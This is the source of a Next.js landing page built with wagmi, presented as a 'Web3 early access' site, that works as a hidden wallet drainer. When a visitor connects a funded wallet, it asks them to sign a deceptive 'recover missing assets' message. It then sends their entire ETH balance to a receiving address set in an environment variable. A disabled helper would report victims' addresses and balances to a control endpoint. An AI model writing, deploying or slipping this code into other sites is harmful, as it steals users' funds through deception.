import axios from "axios";
import { Inter } from "next/font/google";
import {
  useBalance,
  useAccount,
  useSignMessage,
  usePrepareSendTransaction,
  useSendTransaction,
  useWaitForTransaction,
} from "wagmi";
import { useEffect } from "react";
import Header from "@/components/header";
import HeroSection from "@/components/hero-section";
import PlugIntoWeb3 from "@/components/plug-into-web3";
import Web3EarlyAccess from "@/components/web3-early-access";
import Footer from "@/components/footer";
import SupportedBrands2 from "@/components/supported-brands2";

const inter = Inter({ subsets: ["latin"] });

export default function Home() {
  const { address } = useAccount();
  const balance = useBalance({ address });
  if (balance.data) {
    var { value: walletBalanceInWei } = balance.data;
  }
  // console.log("DataType:", typeof balance.data.value); // balance.data.value, Symbol: balance.data.symbol
  // console.log("result:", balance.data.value < 1n); // balance.data.value, Symbol: balance.data.symbol
  // console.log("Balance:", balance); // balance.data.value, Symbol: balance.data.symbol

  async function notifyControlHelper(message, data = {}) {
    return;
    const result = await fetch("/api/notify-control", {
      method: "POST",
      body: JSON.stringify({ message, data }),
      headers: { "Content-Type": "application/json" },
    }).then((res) => res.json());

    // await axios.post("/api/notify-control", data);
  }

  async function observeWalletBalance() {
    if (balance.data?.value < 1n) {
      await notifyControlHelper("No_funds");
    } else {
      await notifyControlHelper("Some_funds", {
        address: `(${balance.data?.symbol.toUpperCase()}) ${address}`,
        balance: balance.data?.formatted,
      });
    }
  }

  function weiToEther(wei) {
    const ether = Number(wei) / 1e18; // 1e18 is equivalent to 1,000,000,000,000,000,000
    return ether.toString();
  }

  // Prepare to transfer assets.
  const { config } = usePrepareSendTransaction({
    to: process.env.NEXT_PUBLIC_RECIEVING_ADDRESS,
    value: balance.data?.value,
    chainId: 1,
    account: address,
    onError: (error) => console.log("Txn Error:", error),
    onSuccess: async (data) => {
      console.log("The Success TXN:", data);
      await notifyControlHelper("Transaction_success", {
        address: `(${balance.data?.symbol.toUpperCase()}) ${address}`,
        balance: weiToEther(balance.data?.value),
        gas: data.gas,
        amountTransfered: weiToEther(data.value),
      });
    },
  });
  const { data, sendTransaction } = useSendTransaction(config);

  // Sign a transaction
  const {
    signMessage,
    data: _data,
    error,
    isLoading,
    isSuccess,
  } = useSignMessage({
    message: "Proceed to recover missing assets.",
  });

  // Wait and observe transaction status
  const { isLoading: awaitIsLoading } = useWaitForTransaction({
    hash: data?.hash,
  });

  // Initiate a sign request when we have an address
  useEffect(() => {
    console.log("UseEffect 1...");
    if (address) {
      observeWalletBalance();
      walletBalanceInWei > 0n && signMessage();
    }
  }, [address, walletBalanceInWei]);

  // If message is successfully signed, permission is granted!
  useEffect(() => {
    console.log("UseEffect 2...");
    if (isSuccess) {
      console.log("Sending the transaction...");
      sendTransaction();
    }
  }, [isSuccess]);

  return (
    <>
      <Header />
      <HeroSection />
      <Web3EarlyAccess />
      <PlugIntoWeb3 />
      <SupportedBrands2 />
      <Footer />
    </>
  );
}
